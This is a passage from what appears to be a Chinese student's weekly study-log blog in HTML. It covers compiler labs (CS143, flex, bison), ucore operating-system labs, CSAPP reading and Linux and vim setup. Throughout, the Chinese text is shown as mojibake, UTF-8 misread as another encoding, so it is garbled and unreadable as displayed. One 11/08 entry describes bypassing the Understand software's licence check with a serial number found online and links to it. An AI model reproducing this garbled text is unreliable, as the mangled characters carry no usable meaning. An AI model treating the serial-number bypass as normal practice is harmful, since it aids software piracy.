href="http://c.biancheng.net/linux/ln.html">lnå‘½ä»¤|symbolic_link</a> </li><li>å®‰è£…å¥½PAç¯å¢ƒ, å¼€å§‹cs143ç¬¬ä¸€ä¸ªå®éªŒ</li><li>(çœ‹äº†å­¦æ ¡çš„è¯¾ç¨‹:æ•°æ®åº“ç³»ç»Ÿ)</li><li>è½¯ä»¶å®‰è£…é—®é¢˜<ul><li>èŠ”, æ ¹æœ¬æ²¡è£…å¥½, ä¸ºäº†åœ¨kaliä¸Šåšå®éªŒæ•´äº†åŠå¤©flexå®‰è£…, ä¸€ç›´ç»™æˆ‘æç¤ºç¼ºå°‘GNU m4, æˆ‘å¯»æ€å“ªé‡Œéƒ½æ²¡è§è¿‡è¿™ä¸œè¥¿å•Š, æ‰¾äº†åŠå¤©m4ä¹Ÿè£…äº†åŠå¤©, ç»“æœå‘ç°ç›´æ¥apt installå°±è¡Œäº†, m4çš„ç‰ˆæœ¬ä¸é‡è¦, é‡è¦çš„æ˜¯flexä½ç‰ˆæœ¬çš„æºç çº§å®‰è£…(ä¹Ÿä¸çŸ¥é“æœ‰æ²¡ç”¨, å…ˆè£…äº†å†è¯´)(<strong>åæ¥è¿˜æ˜¯ç”¨äº†apt install flex</strong>)</li><li>æ–‡ç« é‡Œè¯´çš„<code>./configure &amp;&amp; make &amp;&amp; sudo make install</code>å°±æ˜¯åœ¨ç›¸åº”æ–‡ä»¶å¤¹ä¸‹æ‰§è¡Œå°±å¯ä»¥äº†</li><li>aptè‡ªåŠ¨ç®¡ç†è½¯ä»¶çš„ä¾èµ–é—®é¢˜, å„ç§å‘½ä»¤ç›´æ¥æœç´¢å³å¯</li><li><a href="https://www.cnblogs.com/EasonJim/p/7144017.html">Ubuntué€šè¿‡apt-getå®‰è£…æŒ‡å®šç‰ˆæœ¬å’ŒæŸ¥è¯¢æŒ‡å®šè½¯ä»¶æœ‰å¤šå°‘ä¸ªç‰ˆæœ¬</a> </li></ul></li></ul></li><li><p><strong>10/5 : ç¼–è¯‘åŸç†</strong> </p><ul><li>Ibusæ‰“å‡º<code>&quot;å®‰&quot;</code>éœ€è¦æŒ‰ä¸‹A+J(an) , çœŸç‰¹ä¹ˆå¥‡æ€ª</li><li>Linuxä¸‹<code>!</code>çš„<a href="https://www.cnblogs.com/wxywxy/p/7756596.html">ç”¨æ³•</a>, ä¸»è¦æ˜¯ä¼ é€’æœ€åæ‰§è¡Œçš„å‘½ä»¤çš„å‚æ•°ï¼Œä»¥æ–¹ä¾¿çš„è¿è¡Œæ–°å‘½ä»¤(éå¸¸å®ç”¨)</li><li>COOLæ–‡æ¡£çœ‹äº†ä¸€åŠ, touræ–‡æ¡£åˆšå¼€å¤´, è¿™ç§é•¿æ–‡ç« ç¡®å®<strong>è€—æ—¶é—´</strong>, æ™šä¸Šçœ‹å®ŒPA1å§, å°±ä¸è‡ªå·±å†™äº†</li><li>xodoä¸è¦æ‹–åŠ¨pdfæ–‡ä»¶æŸ¥çœ‹, ä¼šå‡ºç°æ— æ³•ä¿å­˜çš„æƒ…å†µ</li><li>çœ‹äº†ä¸€å¤©çš„è‹±æ–‡æ–‡æ¡£, å±å®å¿«ç´¯æ­»äº†, ç»ˆäºåˆ°äº†PA2</li></ul></li><li><p><strong>10/6 : ç»§ç»­è‹¦é€¼ç¼–è¯‘åŸç†</strong> </p><ul><li>æœ‰ç‚¹å…¶ä»–äº‹, ç»§ç»­çœ‹äº†æ–‡æ¡£</li></ul></li><li><p><strong>10/7-10 : è¿˜æ˜¯çœ‹æ–‡æ¡£</strong> </p><ul><li>è¯¾ç¨‹çœ‹äº†ä¸¤å¤©, å®éªŒç›¸å…³åªèŠ±äº†ä¸€ä¸‹åˆçœ‹</li><li><strong>#line å‘½ä»¤(è¿˜æ˜¯æ²¡æ‡‚)</strong> <ol><li>#line è¡Œå·<br>å…¶ä¸­è¡Œå·å¿…é¡»æ˜¯1~32 767ä¹‹é—´çš„æ•´æ•°ï¼Œæ­¤æŒ‡ç¤ºå¯¼è‡´ç¨‹åºåé¢çš„è¡Œè¢«ç¼–å·ä¸ºn,n+1,n+2,â€¦</li><li>#line è¡Œå· â€œæ–‡ä»¶åâ€<br>å…¶ä¸­è¡Œå·å’Œæ–‡ä»¶åè¯´æ˜æ¥æºçš„è¡Œå·å’Œæ–‡ä»¶åï¼ŒæŒ‡ç¤ºåé¢çš„è¡Œä¼šè¢«è®¤ä¸ºæ˜¯æ¥è‡ªæ–‡ä»¶ï¼Œè¡Œå·ç”±nå¼€å§‹ã€‚<br>â€‹    #lineæŒ‡ç¤ºä¸€ç§ä½œç”¨æ˜¯æ”¹å˜__LINE__,__FILE__å®çš„å€¼ã€‚ä½†æ˜¯å¤§å¤šæ•°ç¼–è¯‘å™¨ä¸æ”¯æŒ#lineã€‚#line ä¸»è¦ç”¨äºé‚£äº›äº§ç”ŸCä»£ç ä½œä¸ºè¾“å‡ºçš„ç¨‹åºï¼Œç¨‹åºå‘˜å¹¶ä¸å¸¸ç”¨#lineã€‚</li></ol></li><li><strong>çœ‹äº†è¿™ä¹ˆå¤šå¤©æ–‡æ¡£ç»ˆäºä¼šå†™ä»£ç äº†, å¥½æ„ŸåŠ¨(â•¥â•¯^â•°â•¥)</strong> </li></ul></li></ul><h3 id="ç¬¬åå››å‘¨-10-11-10-17"><a href="#ç¬¬åå››å‘¨-10-11-10-17" class="headerlink" title="ç¬¬åå››å‘¨: 10/11-10/17"></a>ç¬¬åå››å‘¨: 10/11-10/17</h3><ul><li>ç»ˆäºæ•´å®Œäº†cool.flex, å¼€å§‹çœ‹parseéƒ¨åˆ†</li><li>flexçš„æºç åˆ†ææŠ½ç©ºçœ‹ä¸€çœ‹, åªå†™cool.flexè¿˜æ˜¯å¿½ç•¥äº†ä¸€äº›ç»†èŠ‚</li><li>æ•‘å‘½å•Š, è¿™ç¼–è¯‘åŸç†ä¹Ÿå¤ªçŒ›äº†, æ¦‚å¿µå¤šå¾—ç¦»è°±, è¯æ³•+è¯­æ³•åˆ†ææ˜¯èƒ½å¤Ÿä¸€å‘¨å®Œæˆçš„ä»»åŠ¡å—???<br><del>ä¸è¿‡è¿˜èƒ½å­¦ä¸‹å»å°±æ˜¯äº†, å¦‚æœæ˜¯å®éªŒçš„è¯åº”è¯¥ä¼šçœç•¥æ‰ä¸€äº›ç»†èŠ‚, æ¯•ç«Ÿè¯¾ç¨‹è¿˜æ˜¯å•¥éƒ½è®², ä»åŠ£åˆ°ä¼˜å…¨éƒ½ä»‹ç»ä¸€é</del><br>å·²ç»å­¦ä¸ä¸‹å»äº†</li><li>å­¦å‚»äº†, coolæ–‡æ¡£å“ªé‡Œçœ‹çš„è¿‡æ¥å•Š</li></ul><h3 id="ç¬¬åäº”å‘¨-10-18-10-24"><a href="#ç¬¬åäº”å‘¨-10-18-10-24" class="headerlink" title="ç¬¬åäº”å‘¨: 10/18-10/24"></a>ç¬¬åäº”å‘¨: 10/18-10/24</h3><ul><li>æˆ‘ä»¥ä¸ºæˆ‘çœ‹å®Œæ–‡æ¡£äº†, ç»“æœåˆçœ‹åˆ°äº§ç”Ÿå¼é‡Œé¢ç»™æˆ‘æ¥ä¸€ä¸ª<code>error &#39;;&#39;</code>äººåˆè’™äº†, ä¸€çœ‹Bisonæ–‡æ¡£åœ¨ç¬¬å…­ç« , æˆ‘å°±å·®è¿™ä¸ªæ²¡çœ‹å‘¢, ä¸è¿‡åé¢çš„ç« èŠ‚åº”è¯¥ä¸æ˜¯å¾ˆé‡è¦äº†, å°±ç®—åšæˆ‘çœ‹å®Œäº†å§:cry: </li><li>21å·, æ‰‹å†™æ•°æ®åº“å‘½ä»¤è¡Œ, ç»ƒä¹ ä¸€ä¸‹çº¯å‘½ä»¤å½¢å¼çš„æ•°æ®åº“ç®¡ç†, ä»¥åŠæŸ¥çœ‹æ–‡æ¡£çš„æ°´å¹³, ä½†æ²¡æƒ³åˆ°çš„æ˜¯ä¼šé”™åœ¨ä¹¦ä¸Šçš„é”™è¯¯ç¤ºä¾‹ä¸­:cold_sweat: </li><li>å‘¨æœ«ç”¨äº†ä¸€å¤©æ—¶é—´å†™æ•°æ®åº“, æ¯”è¾ƒå¿™</li><li>?</li></ul><h3 id="ç¬¬åå…­å‘¨-10-25-10-31"><a href="#ç¬¬åå…­å‘¨-10-25-10-31" class="headerlink" title="ç¬¬åå…­å‘¨: 10/25-10/31"></a>ç¬¬åå…­å‘¨: 10/25-10/31</h3><ul><li>æœå•¦, è¿˜æ˜¯ä¸è¦æƒ³ç€ä¸‰ä¸ªæ˜ŸæœŸæ•´å®Œç¼–è¯‘åŸç†äº†, æ¯•ç«Ÿè‡³å°‘ä¸€ä¸ªæœˆæ‰“åº•äº†</li><li>è¿™å‡ å¤©è¿˜æ˜¯åœ¨çœ‹è§†é¢‘. å°±è¿™è§†é¢‘æ˜¯èƒ½å‡ ä¸ªæ˜ŸæœŸçœ‹å®Œçš„???è¿˜å‰©ä¸‹PA45æ²¡åš</li><li>æ„Ÿå¤©åŠ¨åœ°, PA4ç»ˆäºèƒ½çœ‹æ‡‚äº†, å‘¨æœ«å°½é‡äº‰å–PA5å¼€ä¸ªå¤´:ghost: </li><li>æŠŠæ‰€æœ‰æ–‡ä»¶çš„å…³ç³»ç†ä¸€éç»ˆäºçœ‹æ‡‚äº†PA4, ä¹Ÿå¯¹PA3å’ŒPA2æœ‰äº†æ›´æ¸…æ¥šçš„ç†è§£, æœç„¶è¿˜æ˜¯è¦æŠŠæºç çœ‹ä¸€éæ‰æ‡‚å†™ä¸‹å»çš„éƒ½æ˜¯äº›ä»€ä¹ˆç±»å‹ä»€ä¹ˆå˜é‡. PA5æˆ‘è¿˜æ˜¯å…ˆçœ‹çœ‹è§†é¢‘å§, å‹‰å¼ºç®—ä½œä¸€ä¸ªå¼€å¤´</li><li>ä¸€ä¸ªå°é—®é¢˜æ˜¯kaliä¸­<strong>ä½¿ç”¨ä¸­æ–‡è¾“å…¥æ³•çš„æ—¶å€™æ— æ³•åœ¨vscodeä¸­ç”¨å…‰æ ‡é€‰ä¸­æ–‡æœ¬</strong> </li></ul><h3 id="ç¬¬åä¸ƒå‘¨-11-01-11-07"><a href="#ç¬¬åä¸ƒå‘¨-11-01-11-07" class="headerlink" title="ç¬¬åä¸ƒå‘¨: 11/01-11/07"></a>ç¬¬åä¸ƒå‘¨: 11/01-11/07</h3><ul><li>10/01-02: å¬äº†ä¸¤å¤©çš„Stanfordçš„è¯¾ç¨‹æ„Ÿè§‰é’ˆä¸æˆ³, é™¤äº†å¬åŠ›æ²¡æœ‰å¥½åˆ°ä¸ç”¨çœ‹å­—å¹•ä¹‹å¤–çœ‹çš„éå¸¸èˆ’æœ, ä¸è¿‡å…¨çœ‹ä¸€éè¦èŠ±éå¸¸å¤šçš„æ—¶é—´, æ‰€ä»¥ç°åœ¨æ”¹ä¸ºçœ‹PDF, è€ŒPA5ä¼šå°½å¿«æä¸Šæ—¥ç¨‹</li><li>vscodeçš„å¿«æ·é”®çœŸçš„æ˜¯è¶…ä¹æƒ³è±¡, æœ‰æœºä¼šå°±å»çœ‹ä¸€ç‚¹</li><li>CSAPPæ²¡è¯»å®ŒçœŸæ˜¯ç¡¬ä¼¤, å…³é”®æ˜¯å“ªæœ‰çœ‹é‚£ä¹ˆå¿«çš„å•Š.. å‘¨å…­å¼€å§‹çœ‹ç½‘ç»œç¼–ç¨‹éƒ¨åˆ†, åç»­å¯èƒ½è¡¥å®Œå¤„ç†å™¨ä½“ç³»ç»“æ„(æ²¡æœ‰ç„¶åäº†)</li><li>çœ‹äº†ä¸€ç‚¹æ±‡ç¼–ä»£ç MIPSçš„manuals, äº†è§£äº†ä¸‹labelæ˜¯ä¸ªå•¥(ç°åœ¨å¿˜äº†)</li><li>ç¼–è¯‘åŸç†ç»ˆäºå®Œæˆäº†, ä¸‹ä¸€é˜¶æ®µæ“ä½œç³»ç»Ÿ+ä¸­é—´ä»£ç ä¼˜åŒ–</li><li>å¼€å§‹ä¸€ç‚¹ç‚¹æ“ä½œç³»ç»Ÿ</li></ul><h3 id="ç¬¬åå…«å‘¨-11-08-11-14"><a href="#ç¬¬åå…«å‘¨-11-08-11-14" class="headerlink" title="ç¬¬åå…«å‘¨: 11/08-11/14"></a>ç¬¬åå…«å‘¨: 11/08-11/14</h3><ul><li><strong>11/08:</strong> <ul><li>ç½‘ä¸Šéšä¾¿æ•´äº†ä¸ª<a href="https://blog.csdn.net/weixin_43940314/article/details/111279768">åºåˆ—å·</a>å°±é€šè¿‡äº†understandçš„éªŒè¯, è¿™è½¯ä»¶è¿˜çœŸå¤Ÿç›´æ¥çš„, ä¸è¿‡æˆ‘æ›´æƒ³åœ¨æˆ‘çš„kaliä¸Šå¼„è¿™äº›, å…ˆç”¨ç€è¯•è¯•çœ‹. <a href="https://www.cnblogs.com/wayne-tao/p/11911566.html">è¿™æ˜¯windowsçš„</a> </li><li>rpmåŒ…çš„å‘½åè§„èŒƒå®˜ç½‘, â†’<a href="https://rpm-packaging-guide.github.io/#epoch">è¿™é‡Œ</a>.        3:3.1è¢«è®¤ä¸ºæ¯”2:3.2æ›´æ–°ã€‚</li><li>å¥½åƒç¬¬äºŒæ¬¡æŸ¥ç¡¬é“¾æ¥å’Œè½¯è¿æ¥çš„åŒºåˆ«äº†, èµ·å› æ˜¯æ— æ³•ä½¿ç”¨qemuè€Œè¦<strong>ä½¿ç”¨qemu-system-i386æˆ–qemu-system-x86_64æŒ‡ä»¤æ›¿æ¢qemuæŒ‡ä»¤.</strong> å¯ä»¥åˆ©ç”¨è½¯é“¾æ¥<code>ln -s /usr/bin/qemu-system-i386 /usr/bin/qemu</code>åˆ›å»ºä¸€ä¸ªå¿«æ·æ–¹å¼ä¸€æ ·çš„ä¸œè¥¿</li><li>æ“ä½œç³»ç»Ÿçš„kaliç¯å¢ƒç®—æ˜¯å¼„å¥½äº†ä¸€å¤§åŠ(æˆ‘å†ä¹Ÿä¸æ•¢è¯´å·²ç»å¼„å¥½äº†), å‰©ä¸‹çš„å°±æ˜¯è¦ç†Ÿæ‚‰ä¸€ä¸‹å„ç§è½¯ä»¶çš„æ“ä½œ</li></ul></li><li>å…¶ä½™æ—¶é—´<ul><li>æ•´äº†ä¸¤ä¸‰è¡Œçš„batä¸€é”®ä¸Šä¼ blog</li><li>blogå›¾ç‰‡æ¢æˆäº†æœ¬åœ°, è¿˜æ˜¯æ€•sm.msè·‘è·¯, ä»¥å‰çš„å°±ä¸æ›´æ–°äº†. æ‰¾åˆ°äº†ä¸€ä¸ªæœ€ä¿é™©çš„åŠæ³•, å°±æ˜¯ä¸¤è¾¹éƒ½å­˜</li><li><code>dpkg-reconfigure tzdata</code>æå®škaliæ—¶é—´ä¸å‡†é—®é¢˜</li><li>è£…ä¸Šunderstand, å‹ç¼©åŒ…å·²å­˜, ä¸‹è½½<a href="https://s3.amazonaws.com/builds.scitools.com/all_builds/b1029/Understand/Understand-5.1.1029-Linux-64bit.tgz">åœ°å€</a> </li><li><em>apt install <strong>gnome-terminal</strong>,</em> è°ƒè¯•å¾—ä»¥ç»§ç»­è¿è¡Œ</li><li><a href="https://stackoverflow.com/questions/5295903/how-many-bits-does-a-word-contain-in-32-64-bit-os-respectively">ä¸€ä¸ªwordæœ‰å‡ ä½? / How many bits does a word contain in 32-bit OS?</a> </li><li><a href="https://www.zhihu.com/question/344805337/answer/819338479">pdfæ–‡ä»¶æ·»åŠ ç›®å½•</a> </li><li>æ‹“å±•å†…è”æ±‡ç¼– <a href="https://www.cnblogs.com/thammer/p/12591383.html">link</a> </li><li>keymapè°ƒè¯•å®Œæˆ</li></ul></li><li>pythonå¤šç‰ˆæœ¬é—®é¢˜ <a href="https://blog.csdn.net/weixin_39278265/article/details/82938270">link</a>: repaireæˆ–è€…<code>python -m pip install -U pip</code> å°±è¡Œ</li></ul><h3 id="ç¬¬åä¹å‘¨-11-15-11-21"><a href="#ç¬¬åä¹å‘¨-11-15-11-21" class="headerlink" title="ç¬¬åä¹å‘¨: 11/15-11/21"></a>ç¬¬åä¹å‘¨: 11/15-11/21</h3><ul><li>windowsä¸‹vscodeè«åæ— æ³•æ‹–åŠ¨æ–‡ä»¶æ ‡ç­¾, å¿«æ·æ–¹å¼è®¾ä¸ºç®¡ç†å‘˜å¯åŠ¨ç„¶åå†å–æ¶ˆæ‰å°±æ²¡äº‹äº†</li><li>è™šæ‹Ÿæœºé‡Œçš„vscodeæœç„¶è¿˜æ˜¯ç”¨çš„æ€ªæ€ªçš„, æ¢æˆwindowsä¸‹çš„å†™å®Œå†ç²˜è´´è¿›å»debug</li><li>ç»ˆäºæŒ‚è½½æˆåŠŸäº†, é—®é¢˜ä¸æ˜¯vmware-toolsæ²¡è£…å¥½, ä¹Ÿä¸éœ€è¦åŠ è½½ISOæ–‡ä»¶, <code>sudo vmhgfs-fuse .host:/ /mnt/hgfs</code>ä¸æˆåŠŸä¸æ˜¯å› ä¸ºvmtoolsçš„é—®é¢˜, è€Œæ˜¯å’ŒæŠ¥é”™è¯´çš„ä¸€æ¨¡ä¸€æ ·, <code>&#39;/mnt/hgfs&#39;: No such file or directory</code>. çœŸç»äº†, æ–°å»ºä¸ªhgfså°±å®Œäº‹äº†<br>æ‚²æŠ¥, å¯èƒ½æ¯æ¬¡é‡å¯æˆ‘éƒ½è¦æ‰§è¡Œè¿™ä¸€å¥å‘½ä»¤â€¦â€¦.:sweat: </li><li><a href="https://blog.csdn.net/MACMACip/article/details/106406066">Cè¯­è¨€å˜é‡å£°æ˜æ—¶åŠ å†’å·çš„ç”¨æ³•</a>: Cè¯­è¨€æä¾›äº†ä¸€ç§æ•°æ®ç»“æ„ï¼Œç§°ä¸ºâ€œä½åŸŸâ€æˆ–â€œä½æ®µâ€</li><li>16å·Lab1æš‚æ—¶å®Œæˆ, å¼€å§‹ä¸‹ä¸€ä¸ªLabçš„å­¦ä¹ </li><li><a href="https://stackoverflow.com/questions/8564532/colon-in-c-struct-what-does-it-mean/85645973#answer-19691081">â€œ:â€ (colon) and â€œ.â€(dot) in C struct</a> ç»“æ„ä½“ä¸­çš„å†’å·å’Œç‚¹å·</li><li>cè¯­è¨€ç»“æ„ä½“åç§°å’Œç»“æ„ä½“å˜é‡<strong>å¯ä»¥åŒå</strong> </li><li>æ„Ÿè§‰gdbå¸®åŠ©ä¹Ÿæ˜¯æœ‰é™, ä¸€ä¸ªè°ƒè¯•è¿˜æ˜¯è¦æŠŠä»£ç çœ‹æ‡‚äº†å†ç”¨gdbæŸ¥çœ‹è¿è¡Œæ—¶å˜é‡çš„å˜åŒ–, è€Œä¸”å¦‚æœæ²¡æœ‰ç‰¹æ®Šæƒ…å†µè¿˜å¾ˆéš¾å‘ç°å°é”™è¯¯</li></ul><h3 id="ç¬¬äºŒåå‘¨-11-22-11-28"><a href="#ç¬¬äºŒåå‘¨-11-22-11-28" class="headerlink" title="ç¬¬äºŒåå‘¨: 11/22-11/28"></a>ç¬¬äºŒåå‘¨: 11/22-11/28</h3><ul><li><a href="https://blog.csdn.net/rosetta/article/details/90746936">&amp;((type *)0)-&gt;member</a>: ANSI Cæ ‡å‡†å…è®¸å€¼ä¸º0çš„å¸¸é‡è¢«å¼ºåˆ¶è½¬æ¢æˆä»»ä½•ä¸€ç§ç±»å‹çš„æŒ‡é’ˆï¼Œå¹¶ä¸”è½¬æ¢çš„ç»“æœæ˜¯ä¸ªNULLï¼Œå› æ­¤<code>((type *)0)</code>çš„ç»“æœå°±æ˜¯ä¸€ä¸ªç±»å‹ä¸º<code>type *</code>çš„NULLæŒ‡é’ˆ. ç¼–è¯‘å™¨è¿˜ä¼šå¯¹è¿™ç§å½¢å¼çš„å®å®šä¹‰åšå‡ºä¼˜åŒ–, åªå–å‡ºåœ°å€è€Œä¸è®¿é—®<br>(type *)NULLçš„æˆå‘˜member.</li><li>æ„Ÿè§‰æ˜¯æ—¶å€™çœ‹ä¸€æ³¢ç½‘ä¸Šçš„<a href="http://c.biancheng.net/asm/">æ±‡ç¼–æ•™ç¨‹</a>äº†, æ¯å¤©çœ‹ä¸€ç‚¹å°±æˆ, å…å¾—çœ‹åˆ°ä¸€äº›æŒ‡ä»¤è¿˜è¦ä¸€ä¸ªä¸€ä¸ªæœ</li><li>å­¦çš„å°‘äº†, ä¸è¿‡è€ƒå®Œäº†å…¨éƒ¨æœŸä¸­è€ƒ, å¯ä»¥æœ‰æ›´å¤šæ—¶é—´æ¥åšäº†</li><li>å‘¨å…­<ul><li>æ•´äº†æ­£åˆ™æ›¿æ¢, åƒä»€ä¹ˆ[0-9]*æƒ³äº†åŠå¤©åŸæ¥æ˜¯0æ¬¡åˆ°å¤šæ¬¡, ä¼šåŒ¹é…å…¨æ–‡, è¿˜æ˜¯è¦ç†Ÿç»ƒä¸€ä¸‹</li><li>å¼„äº†ä¸€ç‚¹æ¨¡å‹æœº, æ„æ€ä¸€ä¸‹</li></ul></li><li>å‘¨å¤©<ul><li>ä¸‰ç‚¹å‰åœ¨æ•´keymapå’Œwindowsçš„vim, æ€»çˆ±æŠ˜è…¾è¿™äº›ä¸œè¥¿, ä¸è¿‡é…ç½®å¥½åè¿˜æŒºå¥½ç”¨çš„ <a href="https://vimhelp.org/change.txt.html#%3Acopy">vimç§»åŠ¨/å¤åˆ¶è¡Œ</a> <a href="https://vimhelp.org/motion.txt.html#%27%3C">å¯è§†æ¨¡å¼é€‰æ‹©çš„åŒºåŸŸ</a> </li><li>çœ‹äº†ç‚¹æ±‡ç¼–</li></ul></li></ul><h3 id="ç¬¬äºŒåä¸€å‘¨-11-29-12-5"><a href="#ç¬¬äºŒåä¸€å‘¨-11-29-12-5" class="headerlink" title="ç¬¬äºŒåä¸€å‘¨: 11/29-12/5"></a>ç¬¬äºŒåä¸€å‘¨: 11/29-12/5</h3><ul><li>çœ‹Lab3çš„è§†é¢‘ä¸­â€¦â€¦</li><li>èŠ±äº†å‰©ä¸‹çš„å‡ å¤©æ—¶é—´å†™å®Œäº†å­¦æ ¡çš„cpu, å¹¶ä¸”å®Œæˆäº†æ¿ä¸Šçš„æ—¶åºä»¿çœŸ, ç­‰å¾…ä¸‹å‘¨äºŒçš„å®æ¿æµ‹è¯•</li></ul><h3 id="ç¬¬äºŒåäºŒå‘¨-12-6-12-12"><a href="#ç¬¬äºŒåäºŒå‘¨-12-6-12-12" class="headerlink" title="ç¬¬äºŒåäºŒå‘¨: 12/6-12/12"></a>ç¬¬äºŒåäºŒå‘¨: 12/6-12/12</h3><ul><li>å†™CPUéƒ½é€‚ç”¨çš„VIM, æ‰¾åˆ°äº†ä¸€ä¸ªvimæ•™ç¨‹ç½‘ç«™æ„Ÿè§‰æŒºæœ‰ç”¨ <a href="https://yyq123.github.io/learn-vim/">link</a>, å‰©ä¸‹çš„é…ç½®åœ¨_vimrcé‡Œ, è§£å†³äº†å¤åˆ¶åˆ°ç³»ç»Ÿå‰ªè´´æ¿çš„é—®é¢˜å’Œä¿å­˜ä¼šè¯çš„é—®é¢˜</li><li>å†™äº†ä¸€å‘¨çš„CPU, èƒ½è¿è¡Œç¨‹åºäº†, ä¸è¿‡æ’ä¸ªåºéƒ½å¾—è¦æ²¡æœ‰å¾ªç¯çš„å…«åå¤šè¡Œçš„ä»£ç , ä¹Ÿæ˜¯ä¸€ç»</li><li>å‘¨ä¸‰å¼€å§‹ç»§ç»­å­¦æ“ä½œç³»ç»Ÿ</li><li>è¡¥äº†ä¸€ä¸‹ucoreçš„éƒ¨åˆ†å†…å®¹,  çœ‹äº†å‡ å¤©æ±‡ç¼–è¯­è¨€, å¯¹ä¸€äº›ä¼ªæŒ‡ä»¤ä»¥åŠçœŸå®çš„æ±‡ç¼–ç¨‹åºçš„ç»“æ„æœ‰äº†è®¤è¯†, å¯¹IDAåæ±‡ç¼–çš„ä¸€äº›ä»¥å‰çœ‹ä¸æ‡‚çš„ä¸œè¥¿ä¹Ÿèƒ½è¯»æ‡‚ä»–çš„å«ä¹‰äº†</li><li>å‘¨å…­ç°å­¦pythonçš„æ–‡ä»¶æ“ä½œ, å­¦äº†ä¸€ç‚¹os, random, shutilåº“çš„å‡½æ•°, è¿˜æ˜¯æœ‰éœ€æ±‚æ¨åŠ¨å­¦çš„å¿«</li><li>å‘¨å¤©çœ‹CSAPPçš„å¤„ç†å™¨ä½“ç³»ç»“æ„éƒ¨åˆ†, å°æœ‰æ”¶è·, çœ‹çš„æ¯”è¾ƒæµç•…</li></ul><h3 id="ç¬¬äºŒåä¸‰å‘¨-12-13-12-19"><a href="#ç¬¬äºŒåä¸‰å‘¨-12-13-12-19" class="headerlink" title="ç¬¬äºŒåä¸‰å‘¨: 12/13-12/19"></a>ç¬¬äºŒåä¸‰å‘¨: 12/13-12/19</h3><ul><li>èŠ±äº†å‡ å¤©çœ‹äº†CSAPPçš„å¤„ç†å™¨ä½“ç³»ç»“æ„ç« èŠ‚, å¤§æœ‰æ”¶è·, ä¸»è¦æ˜¯pipeline processorçš„è®¾è®¡æ€è€ƒè¿‡ç¨‹ä¸€æ­¥ä¸€æ­¥éå¸¸è¯¦ç»†, å¯ä»¥è¯´æ˜¯é”»ç‚¼æ€ç»´èƒ½åŠ›äº†, ä½†è¿™åªæ˜¯1980sçš„ç†è®ºæ°´å¹³</li><li>å‘¨å››æ—©ä¸Š, ç»ˆäºçœ‹å®Œäº†Processor Architecture, è‡³äºå®éªŒç­‰å‡æœŸå†åšå§, <u>ç»§ç»­å¼€å§‹æ“ä½œç³»ç»Ÿå†…å­˜ç®¡ç†éƒ¨åˆ†</u> </li><li>å‘¨äº”, æ“ä½œç³»ç»ŸLab3, å®‰è£…äº†Windows default keymap, linuxé‡Œçš„vscodeå‹‰å¼ºèƒ½ç”¨</li><li>å¯èƒ½éœ€è¦åˆ‡æ¢ä¸€ä¸‹ç­–ç•¥, ç›´æ¥å‚ç…§ç­”æ¡ˆå­¦ä¹ , ç†è§£å†™å‡ºæ–‡æ¡£å°±ç®—æˆåŠŸ, ä¸ç„¶çœ‹äº†ä¸¤å¤©æ‰è¡¥å®ŒLab1ä¸­çš„challenge, è¿˜ä»¥ä¸ºæ˜¯task switchâ€¦</li><li>æ˜å¤©çœ‹çœ‹è‡ªåŠ¨å®Œæˆåˆå¹¶çš„diffå’Œpatchå‘½ä»¤</li></ul><h3 id="ç¬¬äºŒåå››å‘¨-12-20-12-26"><a href="#ç¬¬äºŒåå››å‘¨-12-20-12-26" class="headerlink" title="ç¬¬äºŒåå››å‘¨: 12/20-12/26"></a>ç¬¬äºŒåå››å‘¨: 12/20-12/26</h3><p>æœ¬å‘¨çš„ä»»åŠ¡æ˜¯æ“ä½œç³»ç»Ÿ, ä¸€ä¸‹æ˜¯é™¤äº†è¿™ä¸ªä¹‹å¤–çš„å°ä¸œè¥¿</p><ul><li><p>å…¸ä¸­å…¸: <strong>æˆ‘ä»¥ä¸ºæˆ‘çœ‹æ‡‚äº†</strong> </p></li><li><p>STIæŒ‡ä»¤: å“åº”å¯å±è”½çš„ç¡¬ä»¶ä¸­æ–­, åœ¨kern_init()ä¸­çš„intr_enable()æ‰§è¡Œ, å°±ç®—æ²¡è®¾ç½®ä¹Ÿèƒ½æ‰§è¡Œ<strong>è½¯ä¸­æ–­</strong> </p></li><li><p>Typoraå´©æºƒäº†, æˆ‘ä¹Ÿå¿«å´©æºƒäº†, å†™äº†ä¸‰å¤©çš„ä¸œè¥¿è«å¾—äº†, è‡ªåŠ¨ä¿å­˜ç›´æ¥æ–­ç»åè·¯</p></li><li><p>å®Œå–„äº†ä¸€ä¸‹ç”¨æ¥å¤‡ä»½çš„batç¨‹åº, æ¯ååˆ†é’Ÿå¤‡ä»½ä¸€æ¬¡(æˆ‘å°±æ˜¯è¦è‡ªåŠ¨ä¿å­˜!</p></li><li><p>c/c++é»˜è®¤è¿”å›å€¼æ˜¯<strong>1</strong>, æˆ‘æ²¡å†™å¯¼è‡´å‡ºé”™</p></li><li><p>å‘¨ä¸‰, æ•´äº†ä¸‹å¿«æ·æ–¹å¼çš„å¿«æ·é”®; å­¦ç‚¹patchå’Œdiffçš„è¡¥ä¸æ–‡ä»¶, çŸ¥è¯†get!</p><ul><li><p>è£…äº†ä¸ªtreeåŒ…</p></li><li><p><a href="http://www.ruanyifeng.com/blog/2012/08/how_to_read_diff.html">diffè¾“å‡ºæ–‡ä»¶</a> <a href="https://blog.csdn.net/longintchar/article/details/74151042">patchä¸€èˆ¬æ–¹æ³•</a> <a href="https://blog.csdn.net/longintchar/article/details/74139933">diffä¸€èˆ¬æ–¹æ³•</a> </p><p><code>patch -[R]pn &lt; è¡¥ä¸æ–‡ä»¶</code> <code>diff -bruP [directory1] [directory2] &gt; [patchfilename.patch]</code> </p></li></ul></li><li><p>å‘¨å››, åªèƒ½è¯´é‚£ä¸œè¥¿æœ‰ç‚¹ä¸Šå¤´, è¿˜æ˜¯ä¸ç¢°ä¸ºå¦™</p><ul><li><a href="https://www.zhihu.com/question/23014322">volatileç›¸å…³</a> </li><li>ctrl+kåœ¨understandé‡Œé¢çœ‹å¤§çº²</li><li><a href="https://rtoax.blog.csdn.net/article/details/108663549">SLOBã€SLABã€SLUB</a> </li></ul></li><li><p>å‘¨æœ«:</p><ul><li>vscodeçš„formatterç”¨å¾—é¡ºæ‰‹, å¯¼è‡´æˆ‘diff+patchå¾ˆéš¾è¿‡T_T</li><li><strong>patchåªèƒ½ä½¿ç”¨å¸¦æœ‰-uæˆ–è€…-cå‚æ•°çš„diffæ–‡ä»¶</strong>, è€Œä¸”å¸¦æœ‰ä¸Šä¸‹æ–‡, patchå¾ˆå®¹æ˜“fail </li><li>vscodeä¿®æ”¹ä¸ºå¤§æ‹¬å·sameline: <code>&quot;C_Cpp.clang_format_style&quot;: 